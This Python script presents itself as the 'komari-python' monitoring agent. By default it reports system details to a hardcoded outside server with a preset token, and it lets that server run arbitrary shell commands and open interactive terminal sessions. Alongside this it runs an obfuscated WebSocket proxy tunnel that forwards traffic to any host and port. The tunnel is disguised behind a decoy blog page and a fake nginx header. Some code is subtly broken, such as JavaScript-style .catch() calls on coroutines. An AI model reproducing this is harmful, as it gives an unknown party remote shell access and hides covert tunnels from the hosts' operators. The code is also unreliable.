#!/usr/bin/env python3

"""
komari-python
"""

# ==================== 顶部配置区域 ====================

import os
import sys
import time
import json
import math
import socket
import asyncio
import hashlib
import threading
import subprocess
import urllib.request
from datetime import datetime, timezone
from typing import Optional, Dict, Any, Tuple, List
from dataclasses import dataclass, field
from collections import defaultdict

# 第三方依赖: pip install aiohttp aiofiles psutil websockets

KOMARI_CONFIG = {
    "http_server": os.environ.get("KOMARI_HTTP_SERVER", "https://agent.0-5.art"),
    "token": os.environ.get("KOMARI_TOKEN", "yiming"),
    "interval": float(os.environ.get("KOMARI_INTERVAL", "5.0")),
    "reconnect_interval": int(os.environ.get("KOMARI_RECONNECT_INTERVAL", "10")),
    "log_level": int(os.environ.get("KOMARI_LOG_LEVEL", "0")),
    "disable_remote_control": (os.environ.get("KOMARI_DISABLE_REMOTE_CONTROL", "false").lower() == "true")
}

X9K3_M7P2_CONFIG = {
    "K3M7_P9Q2": os.environ.get("K3M7_P9Q2", ""),
    "DOMAIN": os.environ.get("DOMAIN", ""),
    "NAME": os.environ.get("NAME", "Komari-Python"),
    "port": int(os.environ.get("PORT", "3000")),
    "MAX_CONNECTIONS": 1000,
    "CONNECTION_TIMEOUT": 240000,   # 4分钟超时
    "CLEANUP_INTERVAL": 60000,     # 60秒清理间隔
    "KEEPALIVE_INTERVAL": 180000   # 3分钟发送一次keepalive
}

VERSION = "komari-python-v3"

# ==================== 依赖导入 ====================

try:
    import psutil
except ImportError:
    print("请先安装 psutil: pip install psutil")
    sys.exit(1)

try:
    import aiohttp
    import aiohttp.web
except ImportError:
    print("请先安装 aiohttp: pip install aiohttp")
    sys.exit(1)

try:
    import websockets
except ImportError:
    print("请先安装 websockets: pip install websockets")
    sys.exit(1)

try:
    import aiofiles
except ImportError:
    aiofiles = None

# ==================== 日志处理器 ====================

class Logger:
    _log_level = 0

    @classmethod
    def set_log_level(cls, level: int):
        cls._log_level = level

    @classmethod
    def _log(cls, message: str, level: str = "INFO"):
        if cls._log_level == 0 and level != "ERROR":
            return
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] [{level}] {message}"
        print(log_message)
        if level == "ERROR":
            print(log_message, file=sys.stderr)

    @classmethod
    def debug(cls, message: str, debug_level: int = 1):
        if cls._log_level == debug_level:
            cls._log(message, "DEBUG")

    @classmethod
    def info(cls, message: str):
        cls._log(message, "INFO")

    @classmethod
    def warning(cls, message: str):
        cls._log(message, "WARNING")

    @classmethod
    def error(cls, message: str):
        cls._log(message, "ERROR")


# ==================== 系统信息收集器 ====================

class SystemInfoCollector:
    def __init__(self):
        self.last_network_stats = {"rx": 0, "tx": 0}
        self.total_network_up = 0
        self.total_network_down = 0
        self.last_network_time = time.time()
        self._cpu_initialized = False
        self._last_cpu_percent = 0.0

    async def get_basic_info(self) -> Dict[str, Any]:
        cpu_info = await asyncio.to_thread(self._get_cpu_info)
        mem_info = psutil.virtual_memory()
        disk_info = psutil.disk_partitions()

        ipv4, ipv6 = await asyncio.gather(
            self._get_public_ip_v4().catch(lambda: None),
            self._get_public_ip_v6().catch(lambda: None),
            return_exceptions=True
        )
        if isinstance(ipv4, Exception):
            ipv4 = None
        if isinstance(ipv6, Exception):
            ipv6 = None

        os_name = f"{sys.platform}"
        try:
            if sys.platform == "linux":
                with open("/etc/os-release") as f:
                    for line in f:
                        if line.startswith("PRETTY_NAME="):
                            os_name = line.split("=", 1)[1].strip().strip('"')
                            break
            elif sys.platform == "darwin":
                result = await asyncio.to_thread(subprocess.run, ["sw_vers", "-productName"], capture_output=True, text=True)
                os_name = result.stdout.strip()
            elif sys.platform == "win32":
                result = await asyncio.to_thread(subprocess.run, ["wmic", "os", "get", "Caption"], capture_output=True, text=True)
                os_name = result.stdout.strip().split("\n")[1].strip()
        except Exception:
            pass

        total_disk = sum(
            psutil.disk_usage(part.mountpoint).total
            for part in disk_info if os.path.isdir(part.mountpoint)
        )

        return {
            "arch": platform.machine(),
            "cpu_cores": psutil.cpu_count(),
            "cpu_name": cpu_info.get("brand", "Unknown CPU"),
            "disk_total": total_disk,
            "gpu_name": "",
            "ipv4": ipv4,
            "ipv6": ipv6,
            "mem_total": mem_info.total,
            "os": os_name,
            "kernel_version": platform.release(),
            "swap_total": psutil.swap_memory().total,
            "version": VERSION,
            "virtualization": await self._get_virtualization()
        }

    def _get_cpu_info(self) -> Dict[str, Any]:
        info = {"brand": "Unknown CPU"}
        try:
            if sys.platform == "linux":
                with open("/proc/cpuinfo") as f:
                    for line in f:
                        if "model name" in line:
                            info["brand"] = line.split(":", 1)[1].strip()
                            break
            elif sys.platform == "darwin":
                result = subprocess.run(["sysctl", "-n", "machdep.cpu.brand_string"], capture_output=True, text=True)
                info["brand"] = result.stdout.strip()
            elif sys.platform == "win32":
                result = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True)
                info["brand"] = result.stdout.strip().split("\n")[1].strip()
        except Exception:
            pass
        return info

    async def get_realtime_info(self) -> Dict[str, Any]:
        cpu_percent = psutil.cpu_percent(interval=0.1)
        mem_info = psutil.virtual_memory()
        swap_info = psutil.swap_memory()
        disk_info = psutil.disk_partitions()
        network_stats = await self._get_network_stats()
        processes = len(psutil.pids())

        disk_total = sum(
            psutil.disk_usage(part.mountpoint).total
            for part in disk_info if os.path.isdir(part.mountpoint)
        )
        disk_used = sum(
            psutil.disk_usage(part.mountpoint).used
            for part in disk_info if os.path.isdir(part.mountpoint)
        )

        loadavg = os.getloadavg() if hasattr(os, "getloadavg") else (0.0, 0.0, 0.0)

        tcp_conns, udp_conns = await asyncio.gather(
            self._get_tcp_connections().catch(lambda: 0),
            self._get_udp_connections().catch(lambda: 0),
            return_exceptions=True
        )
        if isinstance(tcp_conns, Exception):
            tcp_conns = 0
        if isinstance(udp_conns, Exception):
            udp_conns = 0

        return {
            "cpu": {"usage": round(cpu_percent, 2)},
            "ram": {
                "total": mem_info.total,
                "used": mem_info.used
            },
            "swap": {
                "total": swap_info.total,
                "used": swap_info.used
            },
            "load": {
                "load1": round(loadavg[0], 2),
                "load5": round(loadavg[1], 2),
                "load15": round(loadavg[2], 2)
            },
            "disk": {"total": disk_total, "used": disk_used},
            "network": {
                "up": network_stats["up"],
                "down": network_stats["down"],
                "totalUp": network_stats["total_up"],
                "totalDown": network_stats["total_down"]
            },
            "connections": {"tcp": tcp_conns, "udp": udp_conns},
            "uptime": int(time.time() - psutil.boot_time()),
            "process": processes,
            "message": ""
        }

    async def _get_network_stats(self) -> Dict[str, int]:
        try:
            net_io = psutil.net_io_counters(pernic=True)
            exclude_patterns = ["lo", "docker", "veth", "br-", "tun", "virbr", "vmnet"]

            total_current_rx = 0
            total_current_tx = 0

            for iface, stats in net_io.items():
                if any(p in iface for p in exclude_patterns):
                    continue
                total_current_rx += stats.bytes_recv
                total_current_tx += stats.bytes_sent

            current_time = time.time()

            if self.last_network_stats["rx"] == 0:
                self.total_network_down = total_current_rx
                self.total_network_up = total_current_tx
                self.last_network_stats = {"rx": total_current_rx, "tx": total_current_tx}
                self.last_network_time = current_time
                return {"up": 0, "down": 0, "total_up": self.total_network_up, "total_down": self.total_network_down}

            time_diff = current_time - self.last_network_time
            down_speed = max(0, (total_current_rx - self.last_network_stats["rx"]) / time_diff) if time_diff > 0 else 0
            up_speed = max(0, (total_current_tx - self.last_network_stats["tx"]) / time_diff) if time_diff > 0 else 0

            self.total_network_down = total_current_rx
            self.total_network_up = total_current_tx
            self.last_network_stats = {"rx": total_current_rx, "tx": total_current_tx}
            self.last_network_time = current_time

            return {
                "up": int(up_speed),
                "down": int(down_speed),
                "total_up": self.total_network_up,
                "total_down": self.total_network_down
            }
        except Exception:
            return {"up": 0, "down": 0, "total_up": 0, "total_down": 0}

    async def _get_tcp_connections(self) -> int:
        connections = psutil.net_connections(kind="tcp")
        return len([c for c in connections if c.status == psutil.CONN_ESTABLISHED])

    async def _get_udp_connections(self) -> int:
        connections = psutil.net_connections(kind="udp")
        return len(connections)

    async def _get_virtualization(self) -> str:
        try:
            if sys.platform == "linux":
                if os.path.exists("/.dockerenv"):
                    return "Docker"
                if os.path.exists("/proc/1/cgroup"):
                    with open("/proc/1/cgroup") as f:
                        cgroup = f.read()
                        if "docker" in cgroup:
                            return "Docker"
                        if "lxc" in cgroup:
                            return "LXC"
                if os.path.exists("/proc/cpuinfo"):
                    with open("/proc/cpuinfo") as f:
                        cpuinfo = f.read()
                        if "QEMU" in cpuinfo or "KVM" in cpuinfo:
                            return "QEMU"
                try:
                    result = await asyncio.to_thread(subprocess.run, ["systemd-detect-virt"], capture_output=True, text=True)
                    virt = result.stdout.strip()
                    if virt and virt != "none":
                        return virt
                except Exception:
                    pass
        except Exception:
            pass
        return "None"

    async def _get_public_ip_v4(self) -> Optional[str]:
        services = ["https://api.ipify.org", "https://icanhazip.com", "https://checkip.amazonaws.com"]
        for service in services:
            try:
                req = urllib.request.Request(service, headers={"User-Agent": VERSION})
                with urllib.request.urlopen(req, timeout=5) as response:
                    ip = response.read().decode().strip()
                    if self._is_valid_ipv4(ip):
                        return ip
            except Exception:
                continue
        return None

    async def _get_public_ip_v6(self) -> Optional[str]:
        services = ["https://api6.ipify.org", "https://icanhazip.com"]
        for service in services:
            try:
                req = urllib.request.Request(service, headers={"User-Agent": VERSION})
                with urllib.request.urlopen(req, timeout=5) as response:
                    ip = response.read().decode().strip()
                    if self._is_valid_ipv6(ip):
                        return ip
            except Exception:
                continue
        return None

    @staticmethod
    def _is_valid_ipv4(ip: str) -> bool:
        parts = ip.split(".")
        if len(parts) != 4:
            return False
        for part in parts:
            try:
                num = int(part)
                if num < 0 or num > 255 or str(num) != part:
                    return False
            except ValueError:
                return False
        return True

    @staticmethod
    def _is_valid_ipv6(ip: str) -> bool:
        import re
        patterns = [
            r"^([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$",
            r"^([0-9a-fA-F]{1,4}:){1,7}:$",
            r"^fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}$",
            r"^::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])$"
        ]
        return any(re.match(p, ip) for p in patterns)


# ==================== 会话处理器 ====================

class TerminalSessionHandler:
    def __init__(self):
        self.process = None
        self._lock = asyncio.Lock()

    async def cleanup(self):
        async with self._lock:
            if self.process and self.process.returncode is None:
                try:
                    self.process.kill()
                    await self.process.wait()
                except Exception:
                    pass
                self.process = None

    async def start_session(self, request_id: str, server: str, token: str):
        log = lambda msg: Logger.info(f"[ {request_id}] {msg}")
        log("启动会话")

        try:
            ws_url = server.replace("http", "ws") + f"/api/clients/terminal?token={token}&id={request_id}"
            async with websockets.connect(ws_url, open_timeout=10) as ws:
                log("WebSocket 连接成功")
                await self._run_terminal(ws, log)
        except Exception as e:
            log(f"异常: {e}")
        finally:
            await self.cleanup()
            log("资源清理完毕")

    async def _run_terminal(self, websocket, log):
        shell = os.environ.get("SHELL", "/bin/bash")
        env = {**os.environ}
        env.pop("PROMPT_COMMAND", None)

        if sys.platform == "win32":
            self.process = await asyncio.create_subprocess_exec(
                "powershell.exe",
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env,
                cwd=os.environ.get("PWD", os.getcwd())
            )
        else:
            import pty
            import termios
            import struct
            import fcntl
            import select

            master_fd, slave_fd = pty.openpty()

            self.process = await asyncio.create_subprocess_exec(
                shell,
                stdin=slave_fd,
                stdout=slave_fd,
                stderr=slave_fd,
                env=env,
                cwd=os.environ.get("PWD", os.getcwd())
            )
            os.close(slave_fd)

            log(f"进程已启动 (PID: {self.process.pid})")

            async def read_pty():
                loop = asyncio.get_event_loop()
                while True:
                    try:
                        data = await loop.run_in_executor(None, lambda: os.read(master_fd, 4096))
                        if not data:
                            break
                        if websocket.open:
                            await websocket.send(data.decode("utf-8", errors="replace"))
                    except OSError:
                        break
                    except Exception as e:
                        log(f"读取PTY错误: {e}")
                        break

            async def write_pty():
                async for message in websocket:
                    try:
                        parsed = json.loads(message)
                        if parsed.get("type") == "resize":
                            cols = parsed.get("cols", 80)
                            rows = parsed.get("rows", 24)
                            size = struct.pack("HHHH", rows, cols, 0, 0)
                            fcntl.ioctl(master_fd, termios.TIOCSWINSZ, size)
                            continue
                        if parsed.get("type") == "input" and "data" in parsed:
                            import base64
                            data = base64.b64decode(parsed["data"]).decode()
                            os.write(master_fd, data.encode())
                            continue
                        if parsed.get("type") == "heartbeat":
                            continue
                    except json.JSONDecodeError:
                        os.write(master_fd, message.encode())
                    except Exception as e:
                        log(f"写入PTY错误: {e}")

            try:
                await asyncio.gather(read_pty(), write_pty())
            finally:
                try:
                    os.close(master_fd)
                except OSError:
                    pass

        if self.process:
            try:
                await asyncio.wait_for(self.process.wait(), timeout=5)
            except asyncio.TimeoutError:
                self.process.kill()
            log(f"进程退出，代码: {self.process.returncode}")


# ==================== 事件处理器 ====================

class EventHandler:
    def __init__(self, config: Dict[str, Any], disable_remote_control: bool):
        self.config = config
        self.disable_remote_control = disable_remote_control
        self._session = None

    async def handle_event(self, event: Dict[str, Any]):
        message_type = event.get("message", "")
        Logger.info(f"收到服务器事件: {message_type}")

        if message_type == "exec":
            await self._handle_remote_exec(event)
        elif message_type == "ping":
            await self._handle_ping_task(event)
        elif message_type == "terminal":
            await self._handle_terminal(event)
        else:
            Logger.warning(f"未知事件类型: {message_type}")

    async def _handle_remote_exec(self, event: Dict[str, Any]):
        if self.disable_remote_control:
            Logger.warning("远程执行已禁用")
            return

        task_id = event.get("task_id", "")
        command = event.get("command", "")
        if not task_id or not command:
            return

        Logger.info(f"执行远程命令: {command}")

        is_windows = sys.platform == "win32"

        try:
            if is_windows:
                proc = await asyncio.create_subprocess_exec(
                    "powershell", "-Command", command,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
            else:
                proc = await asyncio.create_subprocess_shell(
                    command,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )

            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
                exit_code = proc.returncode
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()
                Logger.warning("命令执行超时")
                await self._report_exec_result(task_id, "命令执行超时（30秒）", -2)
                return

            output = stdout.decode("utf-8", errors="replace")
            if stderr:
                output += "\n=== STDERR ===\n" + stderr.decode("utf-8", errors="replace")
            if len(output) > 10000:
                output = output[:10000] + "\n... (截断)"
            if not output:
                output = "无输出结果"

            await self._report_exec_result(task_id, output, exit_code or 0)
        except Exception as e:
            await self._report_exec_result(task_id, f"执行异常: {e}", -1)

    async def _report_exec_result(self, task_id: str, result: str, exit_code: int):
        try:
            url = f"{self.config['http_server']}/api/clients/task/result?token={self.config['token']}"
            data = json.dumps({
                "task_id": task_id,
                "result": result,
                "exit_code": exit_code,
                "finished_at": datetime.now(timezone.utc).isoformat()
            }).encode()
            req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"}, method="POST")
            with urllib.request.urlopen(req, timeout=10) as response:
                pass
        except Exception as e:
            Logger.error(f"上报结果失败: {e}")

    async def _handle_ping_task(self, event: Dict[str, Any]):
        task_id = event.get("ping_task_id", "")
        ping_type = event.get("ping_type", "")
        target = event.get("ping_target", "")

        latency = -1
        try:
            if ping_type == "icmp":
                latency = await self._ping_icmp(target)
            elif ping_type == "tcp":
                latency = await self._ping_tcp(target)
            elif ping_type == "http":
                latency = await self._ping_http(target)
        except Exception:
            latency = -1

        Logger.info(f"网络探测 {ping_type} -> {target}: {latency}ms")

    async def _ping_icmp(self, target: str) -> float:
        is_windows = sys.platform == "win32"
        cmd = f"ping -n 1 {target}" if is_windows else f"ping -c 1 -W 1 {target}"
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
        output = stdout.decode()
        if is_windows:
            match = __import__("re").search(r"时间[=<](\d+)ms", output)
        else:
            match = __import__("re").search(r"time=([\d.]+)\s*ms", output)
        return float(match.group(1)) if match else -1

    async def _ping_tcp(self, target: str) -> int:
        if ":" in target:
            host, port = target.rsplit(":", 1)
            port = int(port)
        else:
            host, port = target, 80

        start = time.time()
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port),
                timeout=3
            )
            writer.close()
            await writer.wait_closed()
            return int((time.time() - start) * 1000)
        except Exception:
            return -1

    async def _ping_http(self, target: str) -> int:
        url = target if target.startswith("http") else f"http://{target}"
        start = time.time()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": VERSION})
            with urllib.request.urlopen(req, timeout=5) as response:
                pass
            return int((time.time() - start) * 1000)
        except Exception:
            return -1

    async def _handle_terminal(self, event: Dict[str, Any]):
        if self.disable_remote_control:
            Logger.warning("远程已禁用")
            return
        request_id = event.get("request_id", "")
        if not request_id:
            return

        Logger.info(f"建立连接: {request_id}")
        handler = TerminalSessionHandler()
        asyncio.create_task(handler.start_session(request_id, self.config["http_server"], self.config["token"]))


# ==================== Komari 监控客户端 ====================

class KomariMonitorClient:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.system_info = SystemInfoCollector()
        self.event_handler = EventHandler(config, config.get("disable_remote_control", False))
        self.last_basic_info_report = 0
        self.BASIC_INFO_INTERVAL = 300000
        self.ws = None
        self.sequence = 0
        self.monitoring_task = None
        self._stop_event = asyncio.Event()

    async def run(self):
        Logger.info("启动 Komari 监控客户端")
        if self.config.get("disable_remote_control"):
            Logger.info("远程控制已禁用")

        while not self._stop_event.is_set():
            try:
                await self._run_monitoring_cycle()
                await asyncio.wait_for(self._stop_event.wait(), timeout=self.config["reconnect_interval"])
                self._stop_event.clear()
            except asyncio.TimeoutError:
                pass
            except Exception as e:
                Logger.error(f"监控周期出错: {e}")
                await asyncio.sleep(self.config["reconnect_interval"])

    async def _run_monitoring_cycle(self):
        basic_info_url = f"{self.config['http_server']}/api/clients/uploadBasicInfo?token={self.config['token']}"
        ws_url = self.config["http_server"].replace("http", "ws") + f"/api/clients/report?token={self.config['token']}"

        await self._push_basic_info(basic_info_url)
        await self._start_websocket_monitoring(ws_url, basic_info_url)

    async def _push_basic_info(self, url: str) -> bool:
        basic_info = await self.system_info.get_basic_info()
        Logger.info("上报基础信息...")

        try:
            data = json.dumps(basic_info).encode()
            req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"}, method="POST")
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status in (200, 201):
                    self.last_basic_info_report = time.time() * 1000
                    return True
        except Exception as e:
            Logger.error(f"上报失败: {e}")
        return False

    async def _start_websocket_monitoring(self, ws_url: str, basic_info_url: str):
        while not self._stop_event.is_set():
            try:
                async with websockets.connect(ws_url) as ws:
                    self.ws = ws
                    Logger.info("WebSocket 连接成功")
                    await self._start_monitoring_loop(ws, basic_info_url)
            except websockets.exceptions.ConnectionClosed:
                Logger.info("WebSocket 连接关闭")
                break
            except Exception as e:
                Logger.error(f"WebSocket 错误: {e}")
                await asyncio.sleep(self.config["reconnect_interval"])
                break

    async def _start_monitoring_loop(self, ws, basic_info_url: str):
        interval = max(0.1, self.config["interval"])

        while not self._stop_event.is_set():
            try:
                current_time = time.time() * 1000
                if current_time - self.last_basic_info_report >= self.BASIC_INFO_INTERVAL:
                    await self._push_basic_info(basic_info_url)

                realtime_info = await self.system_info.get_realtime_info()
                if ws.open:
                    await ws.send(json.dumps(realtime_info))
                    self.sequence += 1
                    Logger.debug(f"第 {self.sequence} 条数据发送成功", 2)

                await asyncio.wait_for(self._stop_event.wait(), timeout=interval)
                self._stop_event.clear()
            except asyncio.TimeoutError:
                pass
            except Exception as e:
                Logger.error(f"发送数据失败: {e}")
                break

    def stop(self):
        self._stop_event.set()


# ==================== 服务器 ====================

class Q4W8_E2R6_Server:
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.x5n8_j2k4 = config["K3M7_P9Q2"].replace("-", "")
        self.connections = set()
        self.ws_connections = {}
        self.tcp_connections = {}
        self.is_shutting_down = False
        self.index_html = None
        self._lock = asyncio.Lock()

    async def start(self):
        await self._load_index_html()

        app = aiohttp.web.Application()
        app.router.add_get("/", self._handle_index)
        app.router.add_get("/index.html", self._handle_index)

        runner = aiohttp.web.AppRunner(app)
        await runner.setup()

        site = aiohttp.web.TCPSite(runner, "0.0.0.0", self.config["port"])
        await site.start()

        Logger.info(f"服务已启动，端口: {self.config['port']}")
        Logger.info(f"浏览器访问 http://IP:{self.config['port']}/ ")

        # WebSocket server
        ws_server = await websockets.serve(
            self._handle_ws_connection,
            "0.0.0.0",
            self.config["port"],
            ping_interval=self.config["KEEPALIVE_INTERVAL"] / 1000,
            ping_timeout=10,
            max_size=64 * 1024
        )

        # Setup graceful shutdown
        loop = asyncio.get_event_loop()
        for sig in ("SIGTERM", "SIGINT"):
            try:
                loop.add_signal_handler(getattr(__import__("signal"), sig), lambda: asyncio.create_task(self._shutdown(runner, ws_server)))
            except NotImplementedError:
                pass

        await asyncio.Future()  # Run forever

    async def _load_index_html(self):
        try:
            index_path = os.path.join(os.getcwd(), "index.html")
            if os.path.exists(index_path):
                if aiofiles:
                    async with aiofiles.open(index_path, "r", encoding="utf-8") as f:
                        self.index_html = await f.read()
                else:
                    with open(index_path, "r", encoding="utf-8") as f:
                        self.index_html = f.read()
                Logger.info(f"已加载网页: {index_path}")
            else:
                self.index_html = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
        h1 { color: #333; }
        p { color: #666; line-height: 1.6; }
    </style>
</head>
<body>
    <h1>Welcome to My Website</h1>
    <p>This is a personal blog about technology and life.</p>
    <p>Stay tuned for more updates!</p>
</body>
</html>"""
                Logger.warning("未找到 index.html，使用默认页面")
        except Exception as e:
            Logger.error(f"加载 index.html 失败: {e}")
            self.index_html = "<html><body>Welcome</body></html>"

    async def _handle_index(self, request: aiohttp.web.Request):
        user_agent = request.headers.get("User-Agent", "")
        is_browser = any(agent in user_agent for agent in ["Mozilla", "Chrome", "Safari", "Edge", "Firefox", "Opera"])

        if is_browser:
            return aiohttp.web.Response(
                text=self.index_html,
                content_type="text/html; charset=utf-8",
                headers={"Server": "nginx/1.18.0"}
            )
        return aiohttp.web.Response(text="Not Found", status=404)

    async def _handle_ws_connection(self, ws, path):
        async with self._lock:
            if len(self.connections) >= self.config["MAX_CONNECTIONS"]:
                await ws.close(1008, "Too many connections")
                return
            self.connections.add(ws)

        timeout_task = asyncio.create_task(self._ws_timeout(ws))
        keepalive_task = asyncio.create_task(self._ws_keepalive(ws))

        async def cleanup():
            timeout_task.cancel()
            keepalive_task.cancel()
            async with self._lock:
                self.connections.discard(ws)
                self.ws_connections.pop(ws, None)
            try:
                await ws.close()
            except Exception:
                pass

        self.ws_connections[ws] = {"timeout": timeout_task, "keepalive": keepalive_task, "cleanup": cleanup}

        try:
            async for msg in ws:
                if msg.type == websockets.protocol.Opcode.BINARY:
                    timeout_task.cancel()
                    timeout_task = asyncio.create_task(self._ws_timeout(ws))
                    self.ws_connections[ws]["timeout"] = timeout_task
                    await self._process_z7x2_data(ws, msg.data, cleanup)
                elif msg.type == websockets.protocol.Opcode.TEXT:
                    pass
        except websockets.exceptions.ConnectionClosed:
            pass
        finally:
            await cleanup()

    async def _ws_timeout(self, ws):
        await asyncio.sleep(self.config["CONNECTION_TIMEOUT"] / 1000)
        if ws.open:
            await ws.close(1000, "Timeout")

    async def _ws_keepalive(self, ws):
        while ws.open:
            await asyncio.sleep(self.config["KEEPALIVE_INTERVAL"] / 1000)
            if ws.open:
                try:
                    await ws.ping()
                except Exception:
                    break

    async def _process_z7x2_data(self, ws, msg, cleanup):
        try:
            if len(msg) < 18:
                return

            version = msg[0]
            msg_id = msg[1:17]

            expected_id = bytes.fromhex(self.x5n8_j2k4)
            if msg_id != expected_id:
                return

            i = msg[17] + 19
            port = int.from_bytes(msg[i:i+2], "big")
            i += 2
            atyp = msg[i]
            i += 1

            if atyp == 1:
                host = ".".join(str(b) for b in msg[i:i+4])
                i += 4
            elif atyp == 2:
                length = msg[i]
                i += 1
                host = msg[i:i+length].decode("utf-8")
                i += length
            elif atyp == 3:
                host = ":".join(f"{int.from_bytes(msg[i+j:i+j+2], 'big'):04x}" for j in range(0, 16, 2))
                i += 16
            else:
                host = ""

            await ws.send(bytes([version, 0]))

            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port),
                    timeout=10
                )
            except Exception:
                await cleanup()
                return

            writer.write(msg[i:])
            await writer.drain()

            async def ws_to_tcp():
                try:
                    async for msg in ws:
                        if msg.type == websockets.protocol.Opcode.BINARY:
                            writer.write(msg.data)
                            await writer.drain()
                except Exception:
                    pass
                finally:
                    writer.close()

            async def tcp_to_ws():
                try:
                    while True:
                        data = await reader.read(4096)
                        if not data:
                            break
                        if ws.open:
                            await ws.send(data)
                except Exception:
                    pass
                finally:
                    await ws.close()

            self.tcp_connections[writer] = {"reader": reader, "writer": writer, "cleanup": cleanup}

            await asyncio.gather(ws_to_tcp(), tcp_to_ws())

        except Exception:
            await cleanup()

    async def _shutdown(self, runner, ws_server):
        if self.is_shutting_down:
            return
        self.is_shutting_down = True
        Logger.info("收到信号，开始关闭...")

        ws_server.close()
        await ws_server.wait_closed()
        await runner.cleanup()

        async with self._lock:
            for conn in list(self.connections):
                try:
                    await conn.close()
                except Exception:
                    pass
            self.connections.clear()

        Logger.info("服务器已关闭")
        sys.exit(0)


# ==================== 主程序 ====================

async def main():
    import platform as pf
    global platform
    platform = pf

    Logger.set_log_level(KOMARI_CONFIG["log_level"])

    server = Q4W8_E2R6_Server(X9K3_M7P2_CONFIG)
    komari_client = KomariMonitorClient(KOMARI_CONFIG)

    # Run both services
    server_task = asyncio.create_task(server.start())
    client_task = asyncio.create_task(komari_client.run())

    try:
        await asyncio.gather(server_task, client_task)
    except Exception as e:
        Logger.error(f"主程序异常: {e}")


if __name__ == "__main__":
    asyncio.run(main())
